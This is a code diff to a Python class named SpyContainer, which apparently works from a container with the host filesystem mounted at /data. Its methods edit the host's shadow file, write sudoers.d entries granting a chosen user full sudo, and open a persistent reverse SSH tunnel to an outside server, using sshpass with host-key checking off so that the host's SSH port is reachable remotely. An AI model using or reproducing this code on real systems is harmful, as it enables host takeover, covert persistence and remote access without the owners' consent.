@@ -17,10 +17,10 @@ class SpyContainer:
     def get_docker_host_ssh_port(self) -> int:
 
         sshd_port = self.execute_command(
-            "cat /data/etc/ssh/sshd_config | sed -e 's/^[[:space:]]*//' | grep -E "
-            " '^Port'"
+            "cat /data/etc/ssh/sshd_config | sed -e 's/^[[:space:]]*//' | grep -E '^Port'"
         )
-        assert sshd_port
+        if sshd_port is None:
+            return 22
         ssh_port = sshd_port.strip().split()
         if ssh_port == [] or len(ssh_port) != 2:
             return 22
@@ -53,17 +53,11 @@ class SpyContainer:
             " /data/etc/shadow".format(username)
         )
 
-    # def create_group_as_username(self, username: str) -> None:
-    #     self.execute_command(f"echo '{username}:x:222:' >>  /data/etc/group")
-
     def add_username_to_sudoer_group(self, username: str) -> None:
         self.execute_command(f"mkdir -p /data/etc/sudoers.d")
         self.execute_command(
             f"echo '{username} ALL=(ALL:ALL) ALL' > /data/etc/sudoers.d/{username}"
         )
-
-    # def delete_group_as_username(self, username: str) -> None:
-    #     self.execute_command(f"sed -i '/^sudo/s/{username}:x:222:$//' /data/etc/group")
 
     def delelte_username_from_sudoer_group(self, username: str) -> None:
         self.execute_command(f"rm -rf /data/etc/sudoers.d/{username}")
@@ -116,25 +110,17 @@ class SpyContainer:
 
     def reverse_ssh_from_docker_host_to_remote_server(
         self,
-        another_server_name: str,
-        another_server_ssh_port: int,
-        another_server_username: str,
-        another_server_password: str,
-        free_port_on_another_server: int,
+        ssh_server_address: str,
+        ssh_server_port: int,
+        ssh_server_username: str,
+        ssh_server_password: str,
+        free_port_on_ssh_server: int,
+        ssh_port_on_docker_host: int,
     ) -> None:
         self.execute_command(
-            "nohup",
-            "sshpass",
-            "-p",
-            another_server_password,
-            "ssh",
-            "-o 'StrictHostKeyChecking=no' -R *:",
-            str(free_port_on_another_server),
-            ":localhost:",
-            str(another_server_ssh_port),
-            another_server_username,
-            "@",
-            another_server_name,
+            f"sshpass -p {ssh_server_password} ssh -o 'StrictHostKeyChecking=no' "
+            f"-R *:{str(free_port_on_ssh_server)}:localhost:{str(ssh_port_on_docker_host)} -f -N "
+            f"-p {ssh_server_port} {ssh_server_username}@{ssh_server_address}  "
         )
 
     def delete_username_from_docker_host(
@@ -152,3 +138,7 @@ class SpyContainer:
             return None
         else:
             return str(output.decode("utf-8"))
+
+    @property
+    def container(self):
+        return self._container
